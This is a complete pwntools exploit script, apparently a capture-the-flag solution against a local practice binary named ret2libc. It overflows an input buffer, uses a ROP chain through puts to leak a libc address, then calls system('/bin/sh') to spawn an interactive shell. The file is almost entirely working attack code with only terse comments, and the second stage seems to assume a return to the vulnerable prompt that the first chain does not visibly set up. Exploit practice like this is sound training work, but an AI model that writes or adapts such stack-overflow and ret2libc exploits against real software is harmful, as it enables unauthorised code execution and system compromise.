from pwn import *

#init

e = ELF('./ret2libc')
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#vars

puts_got = e.got['puts']
puts_off = libc.symbols['puts']
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Puts got adr: ' + hex(puts_got))
log.info('Puts libc off: ' + hex(puts_off))
log.info('Binsh libc off: ' + hex(binsh_off))

#exploit

#leak libc by with rop to puts plt and writing puts got

rop = ROP(e)
rop.puts(puts_got)
rop.learn()

p.sendlineafter('[Y/N]', b'a' * 40 + rop.chain())

p.recvuntil('!\n\n')
libc_off = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - puts_off

log.info('Libc off: ' + hex(libc_off))

#call system('/bin/sh')

libc.address = libc_off
rop = ROP(libc)
rop.system(libc_off + binsh_off)

p.sendlineafter('[Y/N]', b'a' * 40 + rop.chain())

#pray for flag

p.interactive()
